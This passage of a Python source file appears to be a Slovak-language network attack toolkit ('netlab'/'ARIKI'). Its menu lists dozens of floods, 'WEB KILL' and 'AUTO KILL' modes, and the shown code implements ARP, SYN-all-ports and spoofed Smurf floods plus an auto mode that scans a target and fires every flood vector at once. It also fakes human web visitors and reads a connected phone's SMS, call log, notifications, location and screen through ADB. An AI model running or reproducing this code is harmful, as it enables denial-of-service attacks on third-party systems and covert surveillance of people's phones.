    tgt_ip = get_ip(ask("ciel IP (v nasom LAN)"))
    if not tgt_ip: return
    dur = float(ask("trvanie (0 = ne)", "0"))
    sil = int(ask("sila 1-10", "5"))
    st = Stats(); stop = event()
    procs = spawn(nprocs(sil), arp_worker, (tgt_ip, st, stop))
    live(st, stop, procs, dur, f"ARP flood {tgt_ip}")

# ============================ 21. PING SWEEP ============================
def ping_sweep():
    base = ask("zakladna siet (napr. 192.168.1)")
    if not base: return
    t0 = time.time()
    alive = []
    print(f"  {C}Sweep {base}.1-254 ...{X}")

    def sweep(i):
        ip = f"{base}.{i}"
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        s.settimeout(0.4)
        data = b"NETLAB"
        hdr = struct.pack("!BBHHH", 8, 0, 0, os.getpid() & 0xFFFF, i)
        hdr = hdr[:2] + struct.pack("!H", chksum(hdr + data)) + hdr[2:]
        try:
            s.sendto(hdr + data, (ip, 0))
            s.recvfrom(1024)
            alive.append(ip)
        except socket.timeout:
            pass
        s.close()

    with ThreadPoolExecutor(max_workers=64) as ex:
        list(ex.map(sweep, range(1, 255)))
    print(f"  {G}Zive: {len(alive)}{X} za {time.time()-t0:.1f}s")
    for ip in sorted(alive, key=lambda x: int(x.split(".")[-1])):
        print(f"    {ip}")

# ============================ 22. BANDWIDTH TEST ============================
def bw_worker(pid, ip, port, size, st, stop):
    binder(pid)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 * 1024 * 1024)
    except Exception:
        pass
    data = random.randbytes(size)
    while not stop.is_set():
        ok, err = mmsend(s, [(data, (ip, port))] * BATCH)
        if ok:
            with st.cnt.get_lock():
                st.cnt.value += ok * size
        rate(BATCH)
        eco_sleep()

def bandwidth():
    ip = get_ip(ask("ciel (vypisko meria odosl. rychlost)"))
    if not ip: return
    port = int(ask("port", "4000"))
    dur = float(ask("dlzka testu (s)", "10"))
    sil = int(ask("sila 1-10", "5"))
    size = int(ask("velkost paketu [1024]", "1024"))
    st = Stats(); stop = event()
    procs = spawn(nprocs(sil), bw_worker, (ip, port, size, st, stop))
    live(st, stop, procs, dur, f"Bandwidth test -> {ip}", "B")
    dt = time.time() - st.t0.value
    mbps = st.cnt.value * 8 / dt / 1_000_000 if dt > 0 else 0
    print(f"  {B}DoS. priepustnost: {G}{mbps:.1f} Mbit/s{X}")

# ============================ 23. HTTP MONITOR ============================
def http_monitor():
    url = ask("URL", "http://google.com")
    if not url.startswith("http"):
        url = "http://" + url
    dur = float(ask("dlzka monitorovania (s)", "10"))
    t0 = time.time()
    print(f"  {C}[*] HTTP monitor {url}{X}")
    while time.time() - t0 < dur:
        t = time.time()
        try:
            r = urllib.request.urlopen(url, timeout=5)
            code = r.getcode()
            size = len(r.read())
            r.close()
            ms = (time.time() - t) * 1000
            print(f"  [{ms:6.1f} ms] {G}{code}{X} ({size} B)")
        except Exception as e:
            ms = (time.time() - t) * 1000
            print(f"  [{ms:6.1f} ms] {R}chyba: {e}{X}")
        time.sleep(1)

# ============================ 24. HTTP HEADERS ============================
def http_headers():
    url = ask("URL", "http://google.com")
    if not url.startswith("http"):
        url = "http://" + url
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        ctx = ssl.create_default_context()
        if url.startswith("https"):
            r = urllib.request.urlopen(req, timeout=8, context=ctx)
        else:
            r = urllib.request.urlopen(req, timeout=8)
        print(f"  {B}Status:{X} {r.status}")
        for k, v in r.headers.items():
            print(f"  {C}{k}:{X} {v}")
        r.close()
    except Exception as e:
        print(f"  {R}chyba: {e}{X}")

# ============================ 25. SYN ALL PORTS ============================
def syn_all():
    ip = get_ip(ask("ciel"))
    if not ip: return
    dur = float(ask("trvanie (0 = ne)", "0"))
    sil = int(ask("sila 1-10", "5"))
    pool = build_tcp_pool(ip, (1, 65535), 0x02, None, 1024)
    st = Stats(); stop = event()

    def w(pid, pool, st, stop):
        binder(pid)
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        n = 0
        while not stop.is_set():
            ok, err = mmsend(s, pool[:BATCH])
            n += ok + err
            if n >= 8192:
                with st.cnt.get_lock():
                    st.cnt.value += ok
                    st.err.value += err
                n = 0
            rate(BATCH)
            eco_sleep()

    procs = spawn(nprocs(sil), w, (pool, st, stop))
    live(st, stop, procs, dur, f"SYN all ports {ip}")

# ============================ 26. SMURF (ICMP broadcast) ============================
def smurf_worker(pid, bcast_ip, victim_ip, st, stop):
    binder(pid)
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    dst = socket.inet_aton(bcast_ip)
    victim = socket.inet_aton(victim_ip)
    n = 0
    while not stop.is_set():
        icmp_id = random.randint(0, 0xFFFF)
        data = b"NETLAB" + struct.pack("!d", time.time())
        hdr = struct.pack("!BBHHH", 8, 0, 0, icmp_id, random.randint(0, 0xFFFF))
        hdr = hdr[:2] + struct.pack("!H", chksum(hdr + data)) + hdr[2:]
        icmp = hdr + data
        ip_h = bytearray(20)
        struct.pack_into("!B", ip_h, 0, 0x45)
        struct.pack_into("!H", ip_h, 2, 20 + len(icmp))
        struct.pack_into("!H", ip_h, 4, random.randint(0, 0xFFFF))
        struct.pack_into("!BBH", ip_h, 8, 64, socket.IPPROTO_ICMP, 0)
        ip_h[12:16] = victim
        ip_h[16:20] = dst
        struct.pack_into("!H", ip_h, 10, chksum(bytes(ip_h)))
        try:
            s.sendto(bytes(ip_h) + icmp, (bcast_ip, 0))
            n += 1
        except socket.error:
            with st.err.get_lock():
                st.err.value += 1
        if n >= 1024:
            with st.cnt.get_lock():
                st.cnt.value += n
            n = 0
        eco_sleep()

def my_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return None

def smurf():
    print("  Smurf: ICMP echo na broadcast so zdrojom = tvoja IP (odpovede idu na teba)")
    bcast = get_ip(ask("broadcast adresa LAN (napr. 192.168.1.255)"))
    if not bcast: return
    victim = ask("zdrojova IP (Enter = tvoja vlastna)", my_ip() or "")
    dur = float(ask("trvanie (0 = ne)", "0"))
    sil = int(ask("sila 1-10", "5"))
    st = Stats(); stop = event()
    procs = spawn(nprocs(sil), smurf_worker, (bcast, victim, st, stop))
    live(st, stop, procs, dur, f"Smurf {bcast} -> {victim}")

MENU = f"""
  {C}\u2554{'\u2550'*23} ARIKI \u00b7 MENU {'\u2550'*23}\u2557{X}
  [1]  Ping (ICMP)          [20] ARP flood (LAN)
  [2]  SYN Flood            [21] Ping Sweep
  [3]  TCP Port Scan        [22] Bandwidth Test
  [4]  UDP Flood            [23] HTTP Monitor
  [5]  HTTP Flood (rychl)   [24] HTTP Headers
  [6]  HTTPS Flood (rychly) [25] SYN All Ports
  [7]  Slowloris            [26] Smurf (broadcast)
  [8]  DNS Flood            [27] Traffic Generator (AUTO)
  [9]  ICMP Flood           [28] Web Visitors (ludia)
  [10] Traceroute           [29] Device Watch (ADB)
  [11] TCP Connect Flood    [30] LAN Watch (siet)
  [12] TCP ACK/FIN/RST      [31] Web Scanner (enum)
  [13] Multi-Target Flood   [32] Security Audit
  [14] DNS Resolver Test    [33] CMS Detect
  [15] Whois                [34] Subdomain OSINT
  [16] WEB KILL (crawl+fl)  [35] Cache-Buster Flood
  [17] WIFI Kill (deauth)   [36] TLS Handshake Flood
  [18] Nastavenia           [37] API POST Flood
  [19] RUDY slow POST       [38] Web KILL VSAKO       [39] AUTO KILL (sken+utok)
  {C}\u255a{'\u2550'*59}\u255d{X}
                     {C}[q]{X}  Koniec
"""

def main():
    if os.geteuid() != 0:
        print(f"  {R}[!] Spusti ako root: sudo python3 netlab.py{X}")
        sys.exit(1)
    print(BANNER)
    while True:
        print(MENU)
        ch = ask("vyber")
        if ch == "q": break
        try:
            t0 = time.time()
            if ch == "1": ping()
            elif ch == "2": syn_flood()
            elif ch == "3": port_scan()
            elif ch == "4": udp_flood()
            elif ch == "5": http_flood(False)
            elif ch == "6": http_flood(True)
            elif ch == "7": slowloris()
            elif ch == "8": dns_flood()
            elif ch == "9": icmp_flood()
            elif ch == "10": traceroute()
            elif ch == "11": tcp_flood()
            elif ch == "12": tcp_flag_flood()
            elif ch == "13": multi_flood()
            elif ch == "14": dns_test()
            elif ch == "15": whois()
            elif ch == "16": web_kill()
            elif ch == "17": wifi_kill()
            elif ch == "18": settings()
            elif ch == "19": rudy()
            elif ch == "20": arp_flood()
            elif ch == "21": ping_sweep()
            elif ch == "22": bandwidth()
            elif ch == "23": http_monitor()
            elif ch == "24": http_headers()
            elif ch == "25": syn_all()
            elif ch == "26": smurf()
            elif ch == "27": traffic_gen()
            elif ch == "28": web_visitors()
            elif ch == "29": device_watch()
            elif ch == "30": lan_watch_menu()
            elif ch == "31": web_scan()
            elif ch == "32": sec_audit()
            elif ch == "33": cms_detect()
            elif ch == "34": sub_osint()
            elif ch == "35": cache_flood()
            elif ch == "36": tls_flood()
            elif ch == "37": api_flood()
            elif ch == "38": web_kill_all()
            elif ch == "39": web_kill_auto()
            else: print(f"  {R}Zly vyber{X}")
            if ch not in ("q",):
                print(f"  {Y}cas: {time.time() - t0:.1f} s{X}")
        except KeyboardInterrupt:
            pass
        print(f"  {C}{'\u2500'*58}{X}")
        print()


# ============================ 27. TRAFFIC GENERATOR ============================
def tg_worker(pid, proto, ip, port, smin, smax, rate_pkts, pattern, bon, boff, st, stop):
    binder(pid)
    n = 0; bts = 0
    t0 = time.time()
    phase_on = True
    phase_t = t0
    rand_t = t0
    mult = 1.0
    conns = []
    if proto == "UDP":
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 * 1024 * 1024)
        except Exception:
            pass
    elif proto == "TCP":
        s = None
        for _ in range(4):
            c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c.settimeout(5)
            try:
                c.connect((ip, port))
                conns.append(c)
            except socket.error:
                c.close()
    else:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        icmp_id = random.randint(0, 0xFFFF)
        seq = 0
    while not stop.is_set():
        now = time.time()
        if pattern == "BURST":
            if now - phase_t > (bon if phase_on else boff):
                phase_on = not phase_on
                phase_t = now
            if not phase_on:
                time.sleep(0.02)
                if n >= 8192:
                    with st.cnt.get_lock():
                        st.cnt.value += n
                        st.bytes.value += bts
                    n = 0; bts = 0
                continue
        if rate_pkts <= 0:
            r = 0
        elif pattern == "SINE":
            r = rate_pkts * (0.15 + 0.85 * abs(math.sin((now - t0) * 2 * math.pi / 5.0)))
        elif pattern == "RANDOM":
            if now - rand_t > 0.4:
                rand_t = now
                mult = random.uniform(0.1, 1.0)
            r = rate_pkts * mult
        else:
            r = rate_pkts
        bsize = BATCH if r <= 0 else max(1, min(BATCH, int(r * 0.05)))
        if proto == "UDP":
            batch = [(random.randbytes(random.randint(smin, smax)), (ip, port))
                     for _ in range(bsize)]
            ok, err = mmsend(s, batch)
            if err:
                with st.err.get_lock():
                    st.err.value += err
            n += ok
            bts += ok * ((smin + smax) // 2)
        elif proto == "TCP":
            i = 0
            while i < bsize and not stop.is_set():
                if not conns:
                    for _ in range(4):
                        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        c.settimeout(3)
                        try:
                            c.connect((ip, port))
                            conns.append(c)
                        except socket.error:
                            c.close()
                    if not conns:
                        with st.err.get_lock():
                            st.err.value += 1
                        time.sleep(0.05)
                        continue
                c = conns[random.randrange(len(conns))]
                sz = random.randint(smin, smax)
                try:
                    c.sendall(random.randbytes(sz))
                    n += 1
                    bts += sz
                except socket.error:
                    try:
                        c.close()
                    except socket.error:
                        pass
                    try:
                        conns.remove(c)
                    except ValueError:
                        pass
                    with st.err.get_lock():
                        st.err.value += 1
                i += 1
        else:
            batch = []
            for _ in range(bsize):
                size = random.randint(smin, smax)
                data = random.randbytes(max(4, size - 28))
                hdr = struct.pack("!BBHHH", 8, 0, 0, icmp_id, seq & 0xFFFF)
                hdr = hdr[:2] + struct.pack("!H", chksum(hdr + data)) + hdr[2:]
                batch.append((hdr + data, (ip, 0)))
                seq += 1
            ok, err = mmsend(s, batch)
            if err:
                with st.err.get_lock():
                    st.err.value += err
            n += ok
            bts += ok * ((smin + smax) // 2)
        if n >= 8192:
            with st.cnt.get_lock():
                st.cnt.value += n
                st.bytes.value += bts
            n = 0; bts = 0
        if r > 0:
            time.sleep(bsize / r)
        rate(bsize)
        eco_sleep()
    if n or bts:
        with st.cnt.get_lock():
            st.cnt.value += n
            st.bytes.value += bts

def tg_http_worker(pid, host, port, tls, st, stop):
    binder(pid)
    ctx = ssl.create_default_context()
    conns = []
    proven = set()
    n = 0
    last_sync = time.time()
    req = (f"GET / HTTP/1.1\r\nHost: {host}\r\n"
           "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
           "(KHTML, like Gecko) Chrome/126.0 Safari/537.36\r\n"
           "Accept: */*\r\nConnection: keep-alive\r\n\r\n").encode()
    while not stop.is_set():
        if len(conns) < 8:
            try:
                c = socket.socket()
                c.settimeout(2)
                c.connect((host, port))
                if tls:
                    c = ctx.wrap_socket(c, server_hostname=host)
                conns.append(c)
            except Exception:
                with st.err.get_lock():
                    st.err.value += 1
                time.sleep(0.2)
        if not conns:
            time.sleep(0.2)
            continue
        alive = []
        for c in conns:
            fail = False
            for _ in range(3):
                try:
                    c.sendall(req)
                    n += 1
                    proven.add(id(c))
                except socket.error:
                    fail = True
                    break
            if not fail:
                alive.append(c)
        for c in conns:
            if c in alive:
                continue
            if id(c) not in proven:
                with st.err.get_lock():
                    st.err.value += 1
            proven.discard(id(c))
            try:
                c.close()
            except Exception:
                pass
        conns = alive
        for c in conns:
            try:
                c.recv(65536)
            except Exception:
                pass
        if n >= 8192 or (n >= 512 and time.time() - last_sync > 0.2):
            with st.cnt.get_lock():
                st.cnt.value += n
            n = 0
            last_sync = time.time()
        rate(8)
        eco_sleep()
    if n:
        with st.cnt.get_lock():
            st.cnt.value += n

TOP_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 1433,
            3306, 3389, 5432, 5900, 6379, 8000, 8080, 8443, 8888, 9000, 9090, 27017]

def quick_scan(ip, ports, timeout=0.5):
    open_ports = []
    def probe(p):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            r = s.connect_ex((ip, p)) == 0
            s.close()
            return r
        except Exception:
            return False
    with ThreadPoolExecutor(max_workers=32) as ex:
        futs = {ex.submit(probe, p): p for p in ports}
        for f in as_completed(futs):
            if f.result():
                open_ports.append(futs[f])
    return sorted(open_ports)

def traffic_gen():
    hd("ARIKI \u00b7 TRAFFIC GENERATOR [AUTO]")
    print(f"  {Y}[AUTO] Sam najdem otvorene porty a spustim vsetky vektory naraz{X}")
    target = ask("ciel (domena/IP)", "")
    if not target:
        return
    host = target.split("://")[-1].split("/")[0].strip()
    if not host:
        return
    dur = float(ask("trvanie v s (0 = neobmedzene)", "10"))
    sil = int(ask("sila 1-10", "5"))
    print(f"  {C}[1/3]{X} Resolvujem {host} ...")
    ip = get_ip(host)
    if not ip:
        return
    print(f"  {C}[2/3]{X} Skenujem top porty {ip} ...")
    open_ports = quick_scan(ip, TOP_PORTS)
    st = Stats()
    stop = event()
    plan = []
    web_http = [p for p in open_ports if p in (80, 8000, 8080)]
    web_tls = [p for p in open_ports if p in (443, 8443)]
    other = [p for p in open_ports if p not in web_http and p not in web_tls]
    for p in web_http:
        plan.append((f"HTTP:{p}", tg_http_worker, (host, p, False, st, stop)))
    for p in web_tls:
        plan.append((f"HTTPS:{p}", tg_http_worker, (host, p, True, st, stop)))
    for p in other[:4]:
        plan.append((f"SYN:{p}", syn_worker, (build_tcp_pool(ip, p, 0x02, "", 2048), st, stop)))
    if 53 in open_ports:
        plan.append(("DNS:53", dns_worker, (build_dns_pool(host, 2048), ip, st, stop)))
    plan.append(("ICMP", icmp_worker, (build_icmp_pool(ip, 2048), st, stop)))
    if not open_ports:
        plan.append(("UDP:4000", tg_worker, ("UDP", ip, 4000, 64, 1400, 0.0,
                                             "KONST", 0, 0, st, stop)))
    names = ", ".join(n for n, _, _ in plan)
    print(f"  {C}[3/3]{X} Nasiel som {len(plan)} vektorov: {names}")
    procs = []
    for name, wf, args in plan:
        if wf is tg_http_worker:
            n = nprocs(sil)
        elif wf is syn_worker:
            n = nprocs(sil)
        else:
            n = max(1, nprocs(sil) // 2)
        procs += spawn(n, wf, args)
    live(st, stop, procs, dur, f"AUTO {host} ({ip})", "vstrekov")
    print(f"  {B}Pouzite vektory:{X} {names}")

# ============================ 28. WEB VISITORS (ludia) ============================
V_LANGS = ["sk", "cs", "en-US", "en", "de", "pl", "hu", "fr", "it", "es"]
V_ACCEPT = ("text/html,application/xhtml+xml,application/xml;q=0.9,"
            "image/avif,image/webp,*/*;q=0.8")
V_QUERIES = ["kupit", "cena", "recenzie", "najlepsie", "ako na to", "ceny a dostupnost",
             "informacie", "ako funguje", "porovnanie", "shop", "akcia", "novinky"]

def make_ua():
    r = random.random()
    if r < 0.40:
        v = random.randint(114, 126)
        os_ = random.choice(["Windows NT 10.0; Win64; x64", "Windows NT 10.0; WOW64",
                             "Macintosh; Intel Mac OS X 10_15_7", "X11; Linux x86_64"])
        return f"Mozilla/5.0 ({os_}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36"
    if r < 0.60:
        v = random.randint(115, 129)
        os_ = random.choice(["Windows NT 10.0; Win64; x64", "Windows NT 10.0; WOW64",
                             "Macintosh; Intel Mac OS X 10.15", "X11; Linux x86_64"])
        return f"Mozilla/5.0 ({os_}; rv:{v}.0) Gecko/20100101 Firefox/{v}.0"
    if r < 0.80:
        dev = random.choice(["Pixel 7", "Pixel 8", "SM-G991B", "SM-S901B",
                             "Xiaomi 2201123G", "motorola edge 30 neo"])
        v = random.randint(118, 126)
        return (f"Mozilla/5.0 (Linux; Android 13; {dev}) AppleWebKit/537.36 "
                f"(KHTML, like Gecko) Chrome/{v}.0.0.0 Mobile Safari/537.36")
    if r < 0.90:
        v = random.choice([16, 17])
        return (f"Mozilla/5.0 (iPhone; CPU iPhone OS {v}_0 like Mac OS X) "
                f"AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{v}.0 Mobile/15E148 Safari/604.1")
    v = random.randint(114, 126)
    return (f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            f"(KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36 Edg/{v}.0.0.0")

def v_extref():
    r = random.random()
    q = quote(random.choice(V_QUERIES))
    if r < 0.35:
        d = random.choice(["www.google.com", "www.google.sk", "www.google.cz"])
        return f"https://{d}/search?q={q}"
    if r < 0.45:
        return f"https://www.bing.com/search?q={q}"
    if r < 0.55:
        return random.choice(["https://www.facebook.com/", "https://www.instagram.com/",
                              "https://www.tiktok.com/", "https://www.linkedin.com/"])
    if r < 0.65:
        return random.choice(["https://www.reddit.com/", "https://twitter.com/", "https://x.com/"])
    return ""

def v_links(html, base, host):
    out = []
    for m in re.finditer(r'href\s*=\s*["\']([^"\' ]+)["\']', html, re.I):
        u = urljoin(base, m.group(1))
        p = urlparse(u)
        if p.scheme in ("http", "https") and (p.hostname == host or p.netloc == host):
            out.append(u)
    return list(dict.fromkeys(out))

def v_get(url, ua, lang, jar, ref):
    req = urllib.request.Request(url)
    req.add_header("User-Agent", ua)
    req.add_header("Accept", V_ACCEPT)
    req.add_header("Accept-Language", lang)
    if ref:
        req.add_header("Referer", ref)
    req.add_header("Cache-Control", "max-age=0")
    req.add_header("Upgrade-Insecure-Requests", "1")
    req.add_header("Sec-Fetch-Dest", "document")
    req.add_header("Sec-Fetch-Mode", "navigate")
    site = "same-origin" if ref and urlparse(ref).netloc == urlparse(url).netloc else "cross-site"
    req.add_header("Sec-Fetch-Site", site)
    req.add_header("Sec-Fetch-User", "?1")
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    resp = opener.open(req, timeout=12)
    data = resp.read()
    if resp.headers.get("Content-Encoding") == "gzip":
        data = gzip.decompress(data)
    return data.decode("utf-8", errors="ignore")

def _isleep(sec, stop, step=0.2):
    t0 = time.time()
    while not stop.is_set() and time.time() - t0 < sec:
        time.sleep(step)

def vs_browse(url, ua, lang, jar, st, stop, mdelay, xdelay):
    host = urlparse(url).netloc
    pages = random.randint(1, 10)
    ref = v_extref()
    for p in range(pages):
        if stop.is_set():
            break
        try:
            data = v_get(url, ua, lang, jar, ref)
        except Exception:
            with st.err.get_lock():
                st.err.value += 1
            return False
        with st.cnt.get_lock():
            st.cnt.value += 1
        with st.bytes.get_lock():
            st.bytes.value += len(data)
        _isleep(random.uniform(mdelay, xdelay), stop)
        ref = url
        pool = v_links(data, url, host)
        if pool and random.random() < 0.8:
            url = random.choice(pool)
        elif random.random() < 0.15:
            break
    return True

def vs_worker(vid, url, st, stop, mdelay, xdelay, mingap, maxgap, jar):
    ua = make_ua()
    lang = f"{random.choice(V_LANGS)},{random.choice(V_LANGS)};q=0.9,en;q=0.8"
    while not stop.is_set():
        vs_browse(url, ua, lang, jar, st, stop, mdelay, xdelay)
        _isleep(random.uniform(mingap, maxgap), stop, 1.0)

def vs_browser(pid, url, st, stop, mdelay, xdelay, mingap, maxgap):
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        return
    ua = make_ua()
    host = urlparse(url).netloc
    try:
        with sync_playwright() as pw:
            b = pw.chromium.launch(headless=True)
            ctx = b.new_context(user_agent=ua, locale=random.choice(V_LANGS),
                                viewport={"width": random.randint(360, 1920),
                                          "height": random.randint(640, 1080)})
            page = ctx.new_page()
            while not stop.is_set():
                try:
                    page.goto(url, timeout=15000, wait_until="domcontentloaded")
                    with st.cnt.get_lock():
                        st.cnt.value += 1
                except Exception:
                    with st.err.get_lock():
                        st.err.value += 1
                _isleep(random.uniform(mdelay, xdelay), stop, 0.5)
                for _ in range(random.randint(1, 6)):
                    if stop.is_set():
                        break
                    try:
                        links = page.query_selector_all("a")
                        ln = [l for l in links
                              if urlparse(l.get_attribute("href") or "").netloc in ("", host)]
                        if not ln:
                            break
                        l = random.choice(ln)
                        if l.is_visible():
                            l.click(timeout=4000)
                            with st.cnt.get_lock():
                                st.cnt.value += 1
                    except Exception:
                        pass
                    _isleep(random.uniform(mdelay, xdelay), stop, 0.5)
                    if random.random() < 0.2:
                        break
                _isleep(random.uniform(mingap, maxgap), stop, 1.0)
            b.close()
    except Exception:
        pass

def web_visitors():
    print(f"  {C}--- WEB VISITORS - simulacia realnych navstevnikov ---{X}")
    print(f"  {Y}[!] Pouzivaj LEN na stranky, ktore vlastnis alebo mas povolenie testovat{X}")
    url = ask("vstupna URL", "https://example.com").strip()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    try:
        p = urlparse(url)
        assert p.netloc
    except Exception:
        print(f"  {R}[!] Neplatna URL{X}")
        return
    n = int(ask("pocet navstevnikov (paralelne)", "5"))
    dur = float(ask("trvanie v s (0 = neobmedzene)", "60"))
    mdelay = float(ask("min doba citania na stranke [5]", "5"))
    xdelay = float(ask("max doba citania na stranke [45]", "45"))
    mingap = float(ask("min pauza medzi navstevami s [30]", "30"))
    maxgap = float(ask("max pauza medzi navstevami s [600]", "600"))
    mode = "HTTP"
    if HAS_PW:
        mode = ask("mod (HTTP/BROWSER)", "HTTP").upper()
    st = Stats()
    stop = event()
    if mode == "BROWSER":
        procs = spawn(n, vs_browser, (url, st, stop, mdelay, xdelay, mingap, maxgap))
    else:
        jars = [http.cookiejar.CookieJar() for _ in range(n)]
        threads = [threading.Thread(target=vs_worker,
                                    args=(i, url, st, stop, mdelay, xdelay, mingap, maxgap, jars[i]),
                                    daemon=True) for i in range(n)]
        for t in threads:
            t.start()
        procs = threads
    live(st, stop, procs, dur, f"WebVisitors x{n} -> {url}", "stiahnuti")

# ============================ 29. DEVICE WATCH (ADB) ============================
def adb(args, timeout=30):
    try:
        r = subprocess.run(["adb"] + args, capture_output=True, text=True,
                           timeout=timeout, errors="replace")
        return r.stdout.strip()
    except FileNotFoundError:
        return "ERR: adb nie je nainstalovany - spusti: sudo apt install adb"
    except Exception as e:
        return f"ERR: {e}"

def dw_ts():
    return time.strftime("%d.%m. %H:%M:%S")

def dw_parse_notif(text):
    out = []
    for rec in text.split("NotificationRecord(")[1:]:
        m = re.search(r"key=(\S+?)(?:\s|$)", rec)
        p = re.search(r"pkg=(\S+?)(?:\s|$)", rec)
        t = re.search(r"tickerText=(.+?)(?:\s{2,}|\))", rec)
        if not p:
            continue
        pkg = p.group(1)
        txt = t.group(1).strip() if t else ""
        if txt in ("null", "0"):
            txt = ""
        out.append({"key": m.group(1) if m else pkg,
                    "pkg": pkg, "txt": txt})
    return out

def dw_notifs():
    return dw_parse_notif(adb(["shell", "dumpsys", "notification", "--noredact"]))

def dw_loc():
    text = adb(["shell", "dumpsys", "location"])
    found = []
    for line in text.splitlines():
        if "last location" in line.lower() or "fused location" in line.lower():
            m = re.search(r"\[([\w ./]+) (-?[\d.]+),(-?[\d.]+)([^\]]*)", line)
            if m and not m.group(2).startswith("0.0"):
                acc = re.search(r"hAcc=([\d.]+m?e?[\d.]*)", m.group(4) or "")
                found.append((m.group(1), m.group(2), m.group(3),
                              acc.group(1) if acc else "?"))
    return found

def dw_batt():
    text = adb(["shell", "dumpsys", "battery"])
    out = []
    for line in text.splitlines():
        for k in ("level", "status", "temperature", "health"):
            if line.strip().startswith(k):
                out.append(line.strip())
    return out

def dw_overview():
    print(f"\n  {C}=== PREHLAD ZARIADENIA ==={X}")
    print(f"  {B}Zariadenia:{X}")
    print("  " + adb(["devices"]).replace("\n", "\n  "))
    n = dw_notifs()
    print(f"  {B}Notifikacie:{X} {len(n)} aktualnych")
    for x in n[:8]:
        it = f"  {G}{x['pkg']}{X}"
        if x["txt"]:
            it += f" | {x['txt'][:80]}"
        print(it)
    loc = dw_loc()
    if loc:
        print(f"  {B}Poloha:{X}")
        for prov, la, lo, acc in loc:
            print(f"    {prov} {la},{lo} (acc {acc}) "
                  f"{C}https://www.google.com/maps?q={la},{lo}{X}")
    else:
        print(f"  {Y}Poloha: nedostupna (vypnute GPS / ziadna posledna poloha){X}")
    print(f"  {B}Baterka:{X}")
    for l in dw_batt() or ["  -"]:
        print("   ", l)

def dw_watch():
    interval = float(ask("interval kontroly v s", "5"))
    print(f"  {Y}[!] Sledujem notifikacie kazdych {interval:g} s - Ctrl+C pre koniec{X}")
    logp = os.path.join(os.path.dirname(os.path.abspath(__file__)), "netlab_watch.log")
    seen = {}
    try:
        while True:
            notifs = dw_notifs()
            for x in notifs:
                if x["key"] not in seen:
                    line = f"[{dw_ts()}] {x['pkg']} | {x['txt']}"
                    print(f"  {G}{line}{X}")
                    with open(logp, "a") as f:
                        f.write(line + "\n")
            seen = {x["key"]: x for x in notifs}
            time.sleep(interval)
    except KeyboardInterrupt:
        print(f"\n  {Y}Ukoncene. Log: {logp}{X}")

def dw_screen():
    ts = time.strftime("%Y%m%d_%H%M%S")
    f = os.path.join(os.path.dirname(os.path.abspath(__file__)), f"screen_{ts}.png")
    try:
        with open(f, "wb") as fh:
            subprocess.run(["adb", "exec-out", "screencap", "-p"], stdout=fh,
                           timeout=30)
        if os.path.getsize(f) < 1024:
            os.unlink(f)
            print(f"  {R}[!] Ziadne zariadenie pripojene (adb devices){X}")
            return
        print(f"  {G}Screenshot ulozeny:{X} {f}")
    except Exception as e:
        print(f"  {R}[!] Chyba screenshotu: {e}{X}")

def dw_query(uri, cols, limit=20):
    out = adb(["shell", "content", "query", "--uri", uri,
               "--projection", ":".join(cols), "--limit", str(limit)])
    rows = []
    for line in out.splitlines():
        if not line.startswith("Row: "):
            continue
        d = dict(m.split("=", 1) for m in line.split(" ")[2:] if "=" in m)
        rows.append(d)
    return rows

def dw_sms():
    rows = dw_query("content://sms", ["address", "date", "body"])
    print(f"\n  {C}=== POSLEDNE SMS ==={X}")
    if not rows:
        print("  (ziadne / bez opravnenia)")
    for r in rows:
        t = time.strftime("%d.%m. %H:%M", time.localtime(int(r.get("date", 0)) / 1000)) if r.get("date") else "?"
        print(f"  {G}{r.get('address', '?')[0:25]:25}{X} {t} | {r.get('body', '')[:70]}")

def dw_calls():
    rows = dw_query("content://call_log/calls", ["number", "date", "duration", "type"])
    types = {"1": "PRICHO", "2": "ODCHO", "3": "ZMEŠK", "4": "ODM", "5": "ZDRUŽ"}
    print(f"\n  {C}=== POSLEDNE HOVORY ==={X}")
    if not rows:
        print("  (ziadne / bez opravnenia)")
    for r in rows:
        t = time.strftime("%d.%m. %H:%M", time.localtime(int(r.get("date", 0)) / 1000)) if r.get("date") else "?"
        typ = types.get(r.get("type", ""), r.get("type", "?"))
        print(f"  {B}{typ:6}{X} {r.get('number', '?')[:25]:25} {t} | {r.get('duration', '0')} s")

def dw_procs():
    out = adb(["shell", "top", "-n", "1", "-b", "-m", "15"])
    print(f"\n  {C}=== TOP 15 PROCESOV ==={X}")
    for line in out.splitlines():
        if line.strip() and not line.startswith("Tasks") and "USER" not in line:
            print(" ", line[:120])

def device_watch():
    print(f"  {C}--- DEVICE WATCH (ADB) ---{X}")
    print(f"  {Y}[!] Monitoruje TVOJE vlastne zariadenie cez ADB debug (USB/WiFi){X}")
